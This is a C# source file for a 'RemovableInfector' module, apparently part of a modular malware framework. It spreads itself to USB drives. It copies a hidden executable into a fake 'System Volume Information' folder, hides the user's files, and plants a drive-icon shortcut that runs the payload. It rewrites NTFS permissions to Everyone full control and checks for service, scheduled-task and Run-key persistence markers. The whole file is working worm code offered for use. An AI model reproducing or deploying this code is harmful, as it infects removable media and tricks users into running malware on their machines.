using IWshRuntimeLibrary;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;
using File = System.IO.File;

namespace zort
{
    public class RemovableInfector : IPayloadModule
    {
        private readonly ManagementEventWatcher _watcher = new ManagementEventWatcher();
        private readonly byte[] RECOGNITION_BYTES = { 0x69, 0x7A, 0x42, 0x19, 0x00, 0xCC, 0xEF, 0x42 };
        private const byte VERSION_BYTE = 0x01;
        const string FAKE_FOLDER_NAME = " ";
        const string FAKE_SYSTEM_VOLUME_INFO_NAME = "System Volume Information";

        public string ModuleName => "InfectRemovables";
        public string Description => "Infects removable drives with a fake System Volume Information folder.";
        public ElevationType ElevationType => ElevationType.Both;
        public void Start()
        {
            // Code to start the infection method
            ModuleLogger.Log(this, "InfectRemovables started.");
            TryInfectAll();
            WatchRemovableDrives();
        }
        public void Stop()
        {
            // Code to stop the infection method
            ModuleLogger.Log(this, "InfectRemovables stopped.");
            UnwatchRemovableDrives();
        }

        private void WatchRemovableDrives()
        {
            // Code to watch drives for removable media
            ModuleLogger.Log(this, "Watching drives for removable media...");
            _watcher.EventArrived += new EventArrivedEventHandler((object sender, EventArrivedEventArgs e) =>
            {
                // Code to handle the event when a removable drive is inserted
                ModuleLogger.Log(this, "Removable drive inserted or removed.");

                TryInfectAll();
            });
            _watcher.Query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");
            _watcher.Start();
        }

        private void TryInfectAll()
        {
            //Enumerate all removable drives and infect them
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in drives)
            {
                if (drive.DriveType == DriveType.Removable && drive.IsReady)
                {
                    char driveLetter = drive.Name[0];
                    InfectRemovableDrive(driveLetter);
                }
            }
        }

        private void UnwatchRemovableDrives()
        {
            // Code to stop watching drives
            ModuleLogger.Log(this, "Stopped watching drives.");
            _watcher.Stop();
        }

        private void InfectRemovableDrive(char driveLetter)
        {
            string drivePath = $@"{driveLetter}:\";

            // Check if the drive is removable
            if (!IsRemovableDrive(drivePath)) return;

            string fakeFolderPath = Path.Combine(drivePath, FAKE_FOLDER_NAME);
            string fakeSystemVolumeInfoPath = Path.Combine(fakeFolderPath, FAKE_SYSTEM_VOLUME_INFO_NAME);
            string fakeFilePath = Path.Combine(fakeSystemVolumeInfoPath, "WPSettings.dat");

            byte[] expectedData = GetExpectedData();

            if (IsAlreadyInfected(fakeFilePath, expectedData)) return;

            ModuleLogger.Log(this, $"Infecting removable drive: {driveLetter}");

            if (!EnsureDriveWritable(drivePath))
            {
                //drive still not writable, success is essential. get the most outer writable directory and continue as if that folder was drive root
                ModuleLogger.Log(this, "Drive is not writable. Attempting to find a writable directory.");
                string mostOuterWritableDir = GetMostOuterWritableDirectory(drivePath);
                if (mostOuterWritableDir == null)
                {
                    ModuleLogger.Log(this, "No writable directory found. Retreat :(.");
                    return;
                }
                else
                {
                    ModuleLogger.Log(this, $"Found writable directory: {mostOuterWritableDir}");
                    drivePath = mostOuterWritableDir;
                    fakeFolderPath = Path.Combine(drivePath, FAKE_FOLDER_NAME);
                    fakeSystemVolumeInfoPath = Path.Combine(fakeFolderPath, FAKE_SYSTEM_VOLUME_INFO_NAME);
                    fakeFilePath = Path.Combine(fakeSystemVolumeInfoPath, "WPSettings.dat");
                }
            }

            // Create necessary directories and files
            try { CreateFakeFolderStructure(fakeFolderPath, fakeSystemVolumeInfoPath, fakeFilePath, expectedData); }
            catch (Exception ex)
            {
                ModuleLogger.Log(this, $"Failed to create fake folder structure: {ex.Message}");
                return;
            }

            // Copy executable and set file attributes
            try
            {
                CopyExecutableToFakeFolder(fakeSystemVolumeInfoPath);
                SetFileAttributesForFakeContent(fakeFolderPath, fakeSystemVolumeInfoPath);
            }
            catch (Exception ex)
            {
                ModuleLogger.Log(this, $"Failed to copy executable or set file attributes: {ex.Message}");
                return;
            }

            // Create shortcuts and desktop.ini
            try
            {
                CreateDriveShortcut(fakeFolderPath, driveLetter, fakeSystemVolumeInfoPath);
                CreateDesktopIni(fakeFolderPath);
            }
            catch (Exception ex)
            {
                ModuleLogger.Log(this, $"Failed to create shortcuts or desktop.ini: {ex.Message}");
                return;
            }

            // Move files and folders to the fake folder
            try
            {
                MoveFilesAndFolders(drivePath, fakeFolderPath);
            }
            catch (Exception ex)
            {
                ModuleLogger.Log(this, $"Failed to move files and folders: {ex.Message}");
                return;
            }
        }

        private string GetMostOuterWritableDirectory(string drivePath)
        {
            if (CanWrite(drivePath)) return drivePath;
            var directories = Directory.GetDirectories(drivePath, "*", SearchOption.TopDirectoryOnly);
            foreach (var directory in directories)
            {
                if (CanWrite(directory))
                {
                    ModuleLogger.Log(this, $"Found writable directory: {directory}");
                    return directory;
                }
                else
                {
                    string mostOuterDir = GetMostOuterWritableDirectory(directory);
                    if (mostOuterDir != null)
                    {
                        ModuleLogger.Log(this, $"Found writable directory: {mostOuterDir}");
                        return mostOuterDir;
                    }
                }
            }

            ModuleLogger.Log(this, $"No writable directory found on drive: {drivePath}");
            return null;
        }

        private bool IsRemovableDrive(string drivePath)
        {
            return DriveInfo.GetDrives().Any(d => d.Name == drivePath && d.DriveType == DriveType.Removable);
        }

        private byte[] GetExpectedData()
        {
            byte[] expectedData = new byte[RECOGNITION_BYTES.Length + 1];
            Buffer.BlockCopy(RECOGNITION_BYTES, 0, expectedData, 0, RECOGNITION_BYTES.Length);
            expectedData[RECOGNITION_BYTES.Length] = VERSION_BYTE;
            return expectedData;
        }

        private bool IsAlreadyInfected(string fakeFilePath, byte[] expectedData)
        {
            if (File.Exists(fakeFilePath))
            {
                //TODO: Add check for version byte for updating
                if (File.ReadAllBytes(fakeFilePath).SequenceEqual(expectedData))
                {
                    ModuleLogger.Log(this, "Drive is already infected. Exiting.");
                    return true;
                }
            }
            return false;
        }

        private bool EnsureDriveWritable(string drivePath)
        {
            if (!CanWrite(drivePath))
            {
                ModuleLogger.Log(this, "Drive is not writable. Attempting to rewrite security rules.");
                ChangeNTFSSecurityRules(drivePath);
            }

            // Check again if the drive is writable
            if (!CanWrite(drivePath))
            {
                ModuleLogger.Log(this, "Drive is still not writable. Exiting.");
                return false;
            }

            return true;
        }

        private void CreateFakeFolderStructure(string fakeFolderPath, string fakeSystemVolumeInfoPath, string fakeFilePath, byte[] expectedData)
        {
            // Create fake folders
            Directory.CreateDirectory(fakeFolderPath);
            ModuleLogger.Log(this, $"Created fake folder: {fakeFolderPath}");

            Directory.CreateDirectory(fakeSystemVolumeInfoPath);
            ModuleLogger.Log(this, $"Created fake System Volume Information folder: {fakeSystemVolumeInfoPath}");

            // Create fake file with recognition bytes
            File.WriteAllBytes(fakeFilePath, expectedData);
        }

        private void CopyExecutableToFakeFolder(string fakeSystemVolumeInfoPath)
        {
            byte[] bytes = PersistenceHelper.Clone.Create();
            string clonedExecutablePath = Path.Combine(fakeSystemVolumeInfoPath, "IndexerVolumeGuid.exe");

            using (FileStream fs = new FileStream(clonedExecutablePath, FileMode.Create, FileAccess.Write, FileShare.None))
            {
                fs.Write(bytes, 0, bytes.Length);
            }
            ModuleLogger.Log(this, $"Copied executable to fake folder: {clonedExecutablePath}");
        }

        private void SetFileAttributesForFakeContent(string fakeFolderPath, string fakeSystemVolumeInfoPath)
        {
            // Set the file attributes to system and hidden
            string clonedExecutablePath = Path.Combine(fakeSystemVolumeInfoPath, "IndexerVolumeGuid.exe");
            File.SetAttributes(clonedExecutablePath, FileAttributes.System | FileAttributes.Hidden);
            ModuleLogger.Log(this, $"Set file attributes to system and hidden: {clonedExecutablePath}");

            // Set fake folders and files as system and hidden
            File.SetAttributes(fakeFolderPath, FileAttributes.System | FileAttributes.Hidden);
            File.SetAttributes(fakeSystemVolumeInfoPath, FileAttributes.System | FileAttributes.Hidden);
        }

        private void CreateDriveShortcut(string fakeFolderPath, char driveLetter, string fakeSystemVolumeInfoPath)
        {
            string targetPath = Path.Combine(fakeSystemVolumeInfoPath, "IndexerVolumeGuid.exe");
            string shortcutPath = Path.Combine(fakeFolderPath, $@"{driveLetter}:\.lnk");
            CreateShortcut(shortcutPath, targetPath, @"C:\Windows\System32\SHELL32.dll,79"); // Drive icon
            ModuleLogger.Log(this, $"Created shortcut to executable: {shortcutPath}");
        }

        private void CreateDesktopIni(string fakeFolderPath)
        {
            string desktopIniPath = Path.Combine(fakeFolderPath, "desktop.ini");
            using (StreamWriter writer = new StreamWriter(desktopIniPath))
            {
                writer.WriteLine("[.ShellClassInfo]");
                writer.WriteLine("IconResource=C:\\Windows\\System32\\shell32.dll,79");
            }
            ModuleLogger.Log(this, $"Created desktop.ini: {desktopIniPath}");

            // Set desktop.ini as system and hidden
            File.SetAttributes(desktopIniPath, FileAttributes.System | FileAttributes.Hidden);
        }

        private void MoveFilesAndFolders(string drivePath, string fakeFolderPath)
        {
            DirectoryInfo mostOuterDir = new DirectoryInfo(drivePath);

            foreach (FileInfo file in mostOuterDir.GetFiles())
            {
                if (ShouldSkipFile(file)) continue;
                string newPath = Path.Combine(fakeFolderPath, Path.GetFileName(file.FullName));
                File.Move(file.FullName, newPath);
            }

            foreach (DirectoryInfo directory in mostOuterDir.GetDirectories())
            {
                if (ShouldSkipDirectory(directory)) continue;
                string newPath = Path.Combine(fakeFolderPath, directory.Name);
                Directory.Move(directory.FullName, newPath);
            }
            ModuleLogger.Log(this, "Moved files and folders to fake folder.");
        }

        private bool ShouldSkipFile(FileInfo file)
        {
            return Path.GetFileName(file.FullName) == "desktop.ini" || Path.GetFileName(file.FullName) == "autorun.inf" || Path.GetExtension(file.FullName) == ".lnk";
        }

        private bool ShouldSkipDirectory(DirectoryInfo directory)
        {
            return directory.FullName.Contains(FAKE_SYSTEM_VOLUME_INFO_NAME) ||
                   directory.FullName.Contains(FAKE_FOLDER_NAME) ||
                   directory.FullName.Contains("System Volume Information");
        }


        private static void CreateShortcut(string path, string targetPath, string iconPath, string description = "")
        {
            WshShell shell = new WshShell();
            string shortcutAddress = path;
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = description;
            shortcut.TargetPath = targetPath;
            shortcut.IconLocation = iconPath;
            shortcut.Save();
        }

        private bool CanWrite(string path)
        {
            // Check if the path is writable
            try
            {
                File.Create(Path.Combine(path, "test")).Close();
                File.Delete(Path.Combine(path, "test"));
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void ChangeNTFSSecurityRules(string drivePath)
        {
            try
            {
                ModuleLogger.Log(this, $"Changing NTFS security rules for: {drivePath}");

                // Get the directory info for the drive
                DirectoryInfo directoryInfo = new DirectoryInfo(drivePath);

                // Get the current access control settings
                DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();

                // Remove all existing rules for the Everyone
                var rules = directorySecurity.GetAccessRules(true, true, typeof(SecurityIdentifier));
                foreach (FileSystemAccessRule rule in rules)
                {
                    directorySecurity.RemoveAccessRule(rule);
                }

                // Add a new rule to allow full control for everyone
                FileSystemAccessRule accessRule = new FileSystemAccessRule(
                    "Everyone",
                    FileSystemRights.FullControl,
                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                    PropagationFlags.None,
                    AccessControlType.Allow);

                directorySecurity.AddAccessRule(accessRule);

                // Apply the updated access control settings
                directoryInfo.SetAccessControl(directorySecurity);

                ModuleLogger.Log(this, "NTFS security rules updated successfully.");
            }
            catch (Exception ex)
            {
                ModuleLogger.Log(this, $"Failed to change NTFS security rules: {ex.Message}");
            }
        }

        public static bool IsRunningFromUsb()
        {
            // Check if the current process is running from a removable drive
            string currentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            DriveInfo driveInfo = new DriveInfo(Path.GetPathRoot(currentPath));
            return driveInfo.DriveType == DriveType.Removable;
        }

        public static bool IsRunningFromInfectedUsb()
        {
            if (!IsRunningFromUsb()) return false;
            string currentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            return Path.GetFileName(currentPath) == "IndexerVolumeGuid.exe";
        }

        public static void OpenFakeFolderIfRunningFromInfectedUsb()
        {
            // Check if the current process is running from a removable drive
            if(!IsRunningFromInfectedUsb()) return;
            string currentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string parentFolder = Directory.GetParent(Path.GetDirectoryName(currentPath)).FullName;
            if (parentFolder != null)
            {
                Process.Start("explorer.exe", parentFolder);
                ModuleLogger.Log(typeof(RemovableInfector), $"Opened parent folder: {parentFolder}");
            }
        }

        public static bool IsSystemInfectedx()
        {
            const string serviceName = "conhostsvc";
            try
            {
                // Check if conhostsvc exists
                var service = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName.ToLower() == serviceName);
                if (service != null)
                {
                    ModuleLogger.Log(typeof(RemovableInfector), "System is infected. Service exists.");
                    // Service exists
                    ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} exists. System is infected.");

                    //Start service if not already running
                    var serviceController = new System.ServiceProcess.ServiceController(serviceName);
                    if (serviceController.Status != System.ServiceProcess.ServiceControllerStatus.Running)
                    {
                        serviceController.Start();
                        ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} started.");
                    }
                    else
                    {
                        ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} is already running.");
                    }

                    return true;
                }
                else return false;

            }
            catch (Exception ex)
            {
                ModuleLogger.Log(typeof(RemovableInfector), $"Error checking if system is infected: {ex.Message}");
                return false;
            }
        }

        public static bool IsSystemInfected()
        {
            // Check task scheduler for a task named IPookieBearUWU
            try
            {
                var taskService = new TaskService();
                var task = taskService.GetTask("IPookieBearUWU");
                if (task != null)
                {
                    ModuleLogger.Log(typeof(RemovableInfector), "System is infected. Task exists.");
                    return true;
                }
            }
            catch (Exception ex)
            {
                ModuleLogger.Log(typeof(RemovableInfector), $"Error checking if system is infected: {ex.Message}");
                return false;
            }

            return false;
        }


        public static bool IsSystemInfectedss()
        {
            //Enumerate reg run keys and find the one that runs C:\Users\Public\Pictures\pookie.exe
            string[] runKeys = { @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run" };
            foreach (string runKey in runKeys)
            {
                using (var registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(runKey))
                {
                    if (registryKey != null)
                    {
                        foreach (string valueName in registryKey.GetValueNames())
                        {
                            string value = registryKey.GetValue(valueName)?.ToString();
                            if (value != null && value.Contains("pookie.exe"))
                            {
                                ModuleLogger.Log(typeof(RemovableInfector), $"System is infected. Found registry key: {runKey}");
                                return true;
                            }
                        }
                    }
                }
            }

            return false;
        }
    }
}
